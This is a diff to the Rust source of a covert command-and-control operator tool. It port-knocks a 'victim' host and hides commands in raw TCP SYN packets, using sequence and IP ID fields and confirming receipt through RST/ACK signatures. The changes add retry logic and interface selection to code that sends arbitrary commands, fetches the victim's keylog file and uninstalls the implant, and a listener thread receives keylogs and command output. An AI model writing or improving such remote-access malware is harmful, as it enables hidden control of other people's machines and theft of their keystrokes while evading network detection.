@@ -1,7 +1,7 @@
 use std::io::{self, Write};
 use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::net::{IpAddr, Ipv4Addr};
+use std::net::{TcpStream, IpAddr, Ipv4Addr};
 use std::thread;
 use std::time::Duration;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
@@ -50,43 +50,66 @@ impl Commander {
         }
     }
 
-    /// Direct refactor: Sends data using the covert module's chunking logic
-    fn send_covert_data(&self, payload: &[u8]) {
+   fn send_covert_data(&self, payload: &[u8]) {
         let victim_ip = self.victim_ip.expect("No victim IP");
         let local_ip = self.local_ip.expect("No local IP");
         
+        // Convert payload into stateful chunks (handled by covert.rs)
         let mut state = covert::SenderState::new_from_bytes(payload);
+        
         let protocol = Layer3(IpNextHeaderProtocols::Tcp);
         let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
         let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
 
         while state.has_next() && self.running.load(Ordering::SeqCst) {
             if let Some((ip_id, raw_word, masked_seq)) = state.chunk_to_send() {
-                let syn_pkt = covert::build_syn_packet(
-                    local_ip, victim_ip,
-                    self.rx_port, 
-                    self.tx_port, 
-                    ip_id, masked_seq
-                );
-                
-                let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(), IpAddr::V4(victim_ip));
+                let mut acked = false;
+                let mut attempts = 0;
 
-                // Wait for ACK signature in the RST/ACK packet
-                let start = std::time::Instant::now();
-                while start.elapsed() < Duration::from_millis(400) {
-                    if let Ok((packet, _)) = rx_iter.next() {
-                        if packet.get_source() == victim_ip {
-                            if let Some(recv_id) = covert::parse_rst_ack_ip_id(packet.packet()) {
-                                if recv_id == covert::signature_ip_id(ip_id, raw_word) {
-                                    state.ack();
-                                    break;
+                while !acked && attempts < 5 {
+                    attempts += 1;
+                    
+                    // Build and send the SYN packet containing covert data
+                    let syn_pkt = covert::build_syn_packet(
+                        local_ip, victim_ip,
+                        self.rx_port, self.tx_port, 
+                        ip_id, masked_seq
+                    );
+                    
+                    let _ = tx.send_to(
+                        pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(), 
+                        IpAddr::V4(victim_ip)
+                    );
+
+                    let start = std::time::Instant::now();
+                    // Wait 500ms for the Victim to respond with the signature in the IP ID
+                    while start.elapsed() < Duration::from_millis(500) {
+                        if let Ok((packet, _)) = rx_iter.next() {
+                            if packet.get_source() == victim_ip {
+                                if let Some(recv_id) = covert::parse_rst_ack_ip_id(packet.packet()) {
+                                    let expected_sig = covert::signature_ip_id(ip_id, raw_word);
+                                    if recv_id == expected_sig {
+                                        state.ack();
+                                        acked = true;
+                                        break;
+                                    }
                                 }
                             }
                         }
                     }
+
+                    if !acked {
+                        println!("[!] Timeout (Chunk {}), retry {}/5...", state.index, attempts);
+                    }
+                }
+
+                if !acked {
+                    println!("[!!!] Connection lost or Victim is not ACKing. Aborting command.");
+                    return;
                 }
             }
         }
+        println!("[+] Command sent successfully.");
     }
 
     pub fn run(&mut self) {
@@ -128,9 +151,11 @@ impl Commander {
         }
     }
 
+    // In main.rs
+
     fn initiate_connection(&mut self) {
-        let target_ip = prompt("Target IP [127.0.0.1]: ");
-        let ip = target_ip.parse::<Ipv4Addr>().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
+        let target_ip_str = prompt("Target IP [127.0.0.1]: ");
+        let ip = target_ip_str.parse::<Ipv4Addr>().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
 
         match port_knkr::port_knock(ip) {
             Ok(session) => {
@@ -139,19 +164,52 @@ impl Commander {
                 self.rx_port = session.rx_port;
                 self.knock_session = Some(session);
                 
-                let iface_name = Self::find_best_interface(ip).unwrap_or_else(|| "lo".to_string());
-                let interface = datalink::interfaces().into_iter().find(|i| i.name == iface_name).unwrap();
-                self.local_ip = interface.ips.iter().find_map(|ip| if let IpAddr::V4(v4) = ip.ip() { Some(v4) } else { None });
+                // FIX: Identify local IP and interface properly
+                if let Some((iface_name, local_v4)) = Self::find_interface_for_target(ip) {
+                    println!("[*] Using interface: {} with IP: {}", iface_name, local_v4);
+                    self.local_ip = Some(local_v4);
+                } else {
+                    // Fallback to loopback if nothing else is found
+                    println!("[!] Warning: Could not find best interface, falling back to 127.0.0.1");
+                    self.local_ip = Some(Ipv4Addr::new(127, 0, 0, 1));
+                }
 
                 self.running.store(true, Ordering::SeqCst);
                 self.state = SessionState::Connected;
-                
-                // Spawn the background listener for victim responses/keylogs
-                self.spawn_listener();
+                self.spawn_listener(); 
                 println!("[+] Session Established.");
             }
             Err(e) => println!("[!] Knock failed: {}", e),
         }
+    }
+
+    // Improved interface selection logic
+    fn find_interface_for_target(target: Ipv4Addr) -> Option<(String, Ipv4Addr)> {
+        let interfaces = datalink::interfaces();
+        
+        // 1. Try to find an interface that is in the same subnet
+        for iface in &interfaces {
+            for ip_net in &iface.ips {
+                if let IpAddr::V4(local_v4) = ip_net.ip() {
+                    if ip_net.contains(IpAddr::V4(target)) {
+                        return Some((iface.name.clone(), local_v4));
+                    }
+                }
+            }
+        }
+
+        // 2. Fallback: Find the first non-loopback up interface
+        for iface in &interfaces {
+            if iface.is_up() && !iface.is_loopback() {
+                for ip_net in &iface.ips {
+                    if let IpAddr::V4(local_v4) = ip_net.ip() {
+                        return Some((iface.name.clone(), local_v4));
+                    }
+                }
+            }
+        }
+
+        None
     }
 
     fn spawn_listener(&self) {
@@ -191,8 +249,17 @@ impl Commander {
     fn request_keylog_file(&mut self) { self.send_covert_data(&[CMD_REQUEST_KEYLOG]); }
     fn run_program(&mut self) {
         let cmd = prompt("Command: ");
-        self.send_covert_data(cmd.as_bytes());
+        if !cmd.is_empty() {
+            println!("[*] Sending command...");
+            self.send_covert_data(cmd.as_bytes());
+            
+            // 3️⃣ NOTIFY USER (Addresses point 3 of your analysis)
+            println!("[*] Command sent. Waiting for response from listener thread...");
+            // The output will be printed by the spawn_listener() thread 
+            // whenever the victim sends the response chunks back.
+        }
     }
+
     fn uninstall(&mut self) {
         self.send_covert_data(&[CMD_UNINSTALL]);
         self.disconnect();
